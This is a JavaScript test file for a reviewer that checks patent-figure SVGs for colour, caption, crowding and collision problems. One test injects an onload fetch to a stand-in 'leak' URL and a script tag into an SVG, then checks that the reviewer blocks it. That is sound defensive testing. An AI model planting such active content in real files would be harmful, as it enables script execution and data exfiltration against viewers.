import { test } from "node:test";
import assert from "node:assert/strict";

import { renderFigure } from "../render.mjs";
import { aggregateReviews, missingSvgReview, reviewFigure } from "../quality.mjs";

const CLEAN = {
  fig: "FIG01",
  width: 700,
  height: 520,
  parts: [
    { numeral: "10", label: "input", shape: "box", x: 90, y: 120, w: 180, h: 90 },
    { numeral: "12", label: "processor", shape: "box", x: 420, y: 120, w: 190, h: 90 },
  ],
  arrows: [{ from: "10", to: "12", kind: "flow" }],
};

function assertStructuredFinding(f) {
  assert.ok(f.sheet, "finding includes sheet");
  assert.ok(f.figure, "finding includes figure");
  assert.ok("bbox" in f, "finding includes bbox field");
  assert.ok(f.issue_type, "finding includes issue_type");
  assert.ok(f.rule_reference, "finding includes rule_reference");
  assert.match(f.measured_or_visual, /^(measured|visual)$/);
  assert.ok(f.suggested_fix, "finding includes suggested_fix");
}

test("reviewFigure: clean generated SVG is candidate-ready", () => {
  const review = reviewFigure(CLEAN, renderFigure(CLEAN));
  assert.equal(review.blocking, 0);
  assert.equal(review.fixes, 0, JSON.stringify(review.findings));
  assert.equal(review.verdict, "candidate-ready-for-human-review");
  assert.equal(review.score, 100);
  assert.equal(review.sheet, "SHEET 1");
  assert.equal(review.findings.length, 1);
  assertStructuredFinding(review.findings[0]);
  assert.equal(review.findings[0].severity, "acceptable");
});

test("reviewFigure: non-BW color and missing caption produce blocking findings", () => {
  const svg = renderFigure(CLEAN)
    .replace('stroke="black"', 'stroke="#333333"')
    .replace(/FIG\. 1/g, "Figure One");
  const review = reviewFigure(CLEAN, svg);
  assert.ok(review.blocking >= 1);
  assert.ok(review.findings.some((f) => f.code === "SVG_COLOR_SYNTAX"));
  assert.ok(review.findings.some((f) => f.code === "FIG_CAPTION_MISSING"));
  assert.equal(review.verdict, "redraw");
  for (const f of review.findings) assertStructuredFinding(f);
  assert.ok(review.findings.find((f) => f.code === "FIG_CAPTION_MISSING").bbox);
});

test("reviewFigure: crowding, margin, and small-text findings include actionable locations", () => {
  const crowded = {
    fig: "FIG88",
    width: 360,
    height: 250,
    parts: [
      { numeral: "10", label: "very long text that should not be squeezed into a patent figure box", shape: "box", x: 4, y: 165, w: 150, h: 62 },
      { numeral: "12", label: "overlap", shape: "box", x: 90, y: 178, w: 150, h: 62 },
    ],
    arrows: [{ from: "10", to: "12", kind: "flow" }],
  };
  const svg = renderFigure(crowded).replace(/font-size="16"/g, 'font-size="8"');
  const review = reviewFigure(crowded, svg);
  for (const code of ["PART_NEAR_EDGE", "CAPTION_CROWDING", "PART_OVERLAP", "SMALL_TEXT"]) {
    const f = review.findings.find((item) => item.code === code);
    assert.ok(f, `${code} exists`);
    assertStructuredFinding(f);
    assert.ok(Array.isArray(f.bbox), `${code} has bbox`);
  }
  assert.ok(review.measurement_summary.measured > 0);
  assert.ok(review.measurement_summary.visual > 0);
});

test("reviewFigure: connector lines crossing text are fix-before-filing findings", () => {
  const bad = {
    ...CLEAN,
    fig: "FIG09",
    arrows: [{ from: "10", to: "12", kind: "flow", label: "crossing", labelX: 345, labelY: 170 }],
  };
  const review = reviewFigure(bad, renderFigure(bad));
  const finding = review.findings.find((f) => f.code === "ARROW_TEXT_COLLISION");
  assert.ok(finding, JSON.stringify(review.findings, null, 2));
  assert.equal(finding.severity, "fix-before-filing");
  assertStructuredFinding(finding);
  assert.ok(Array.isArray(finding.bbox));
  assert.ok(finding.collisions.some((c) => c.text === "crossing"));
});

test("reviewFigure: labels squeezed against part borders are fix-before-filing findings", () => {
  const bad = {
    fig: "FIG11",
    width: 520,
    height: 380,
    styleScale: 1.5,
    parts: [
      { numeral: "10", label: "orientation channel", shape: "box", x: 150, y: 110, w: 145, h: 84 },
      { numeral: "12", label: "output", shape: "box", x: 340, y: 110, w: 120, h: 84 },
    ],
    arrows: [{ from: "10", to: "12", kind: "flow" }],
  };
  const review = reviewFigure(bad, renderFigure(bad));
  const finding = review.findings.find((f) => f.code === "LABEL_BORDER_CROWDING");
  assert.ok(finding, JSON.stringify(review.findings, null, 2));
  assert.equal(finding.severity, "fix-before-filing");
  assertStructuredFinding(finding);
  assert.ok(finding.collisions.some((c) => c.numeral === "10"));
});

test("reviewFigure: ellipse labels are checked against the curved boundary", () => {
  const bad = {
    fig: "FIG12",
    width: 520,
    height: 380,
    styleScale: 1.4,
    parts: [
      { numeral: "10", label: "orientation channel", shape: "ellipse", x: 120, y: 100, w: 150, h: 82 },
      { numeral: "12", label: "output", shape: "box", x: 350, y: 100, w: 110, h: 82 },
    ],
    arrows: [{ from: "10", to: "12", kind: "flow" }],
  };
  const review = reviewFigure(bad, renderFigure(bad));
  const finding = review.findings.find((item) => item.code === "LABEL_BORDER_CROWDING");
  assert.ok(finding, JSON.stringify(review.findings, null, 2));
  assert.ok(finding.collisions.some((item) => item.numeral === "10" && item.shape === "ellipse"));
});

test("reviewFigure: connector crossing an unrelated feature is fix-before-filing", () => {
  const bad = {
    fig: "FIG13",
    width: 780,
    height: 420,
    parts: [
      { numeral: "10", label: "source", shape: "box", x: 70, y: 140, w: 140, h: 90 },
      { numeral: "12", label: "unrelated", shape: "box", x: 320, y: 130, w: 140, h: 110 },
      { numeral: "14", label: "target", shape: "box", x: 570, y: 140, w: 140, h: 90 },
    ],
    arrows: [{ from: "10", to: "14", kind: "flow" }],
  };
  const review = reviewFigure(bad, renderFigure(bad));
  const finding = review.findings.find((item) => item.code === "ARROW_PART_COLLISION");
  assert.ok(finding, JSON.stringify(review.findings, null, 2));
  assert.ok(finding.collisions.some((item) => item.crosses === "12"));
});

test("reviewFigure: reference numerals overlapping sibling features are fix-before-filing findings", () => {
  const bad = {
    fig: "FIG10",
    width: 700,
    height: 520,
    parts: [
      { numeral: "10", label: "first part", shape: "box", x: 110, y: 140, w: 180, h: 90 },
      { numeral: "12", label: "second part", shape: "box", x: 420, y: 140, w: 180, h: 90, numX: 185, numY: 185 },
    ],
    arrows: [],
  };
  const review = reviewFigure(bad, renderFigure(bad));
  const finding = review.findings.find((f) => f.code === "NUMERAL_PART_COLLISION");
  assert.ok(finding, JSON.stringify(review.findings, null, 2));
  assert.equal(finding.severity, "fix-before-filing");
  assertStructuredFinding(finding);
  assert.ok(finding.collisions.some((c) => c.numeral === "12" && c.overlaps === "10"));
});

test("reviewFigure blocks active SVG even when expected figure content remains present", () => {
  const rendered = renderFigure(CLEAN).replace(
    "<svg ",
    '<svg onload="fetch(\'https://example.test/leak\')" ',
  ).replace("</svg>", "<script>alert(1)</script></svg>");
  const review = reviewFigure(CLEAN, rendered);
  const finding = review.findings.find((item) => item.code === "SVG_UNSAFE_ACTIVE_CONTENT");
  assert.ok(finding, JSON.stringify(review.findings, null, 2));
  assert.equal(finding.severity, "blocking");
  assert.ok(finding.issues.some((item) => item.code === "SVG_ACTIVE_TAG"));
  assert.ok(finding.issues.some((item) => item.code === "SVG_EVENT_ATTRIBUTE"));
});

test("missingSvgReview uses the same structured finding shape", () => {
  const review = missingSvgReview("FIG77", "missing.svg");
  assert.equal(review.blocking, 1);
  assert.equal(review.findings[0].code, "SVG_MISSING");
  assertStructuredFinding(review.findings[0]);
});

test("aggregateReviews summarizes min and mean score", () => {
  const a = reviewFigure(CLEAN, renderFigure(CLEAN));
  const b = { ...a, score: 80, fixes: 1, verdict: "polish-before-filing" };
  const report = aggregateReviews([a, b]);
  assert.equal(report.figure_count, 2);
  assert.equal(report.mean_score, 90);
  assert.equal(report.min_score, 80);
  assert.equal(report.verdict, "polish-before-filing");
  assert.ok(Array.isArray(report.findings));
  assert.ok(report.measurement_summary.measured >= 1);
});
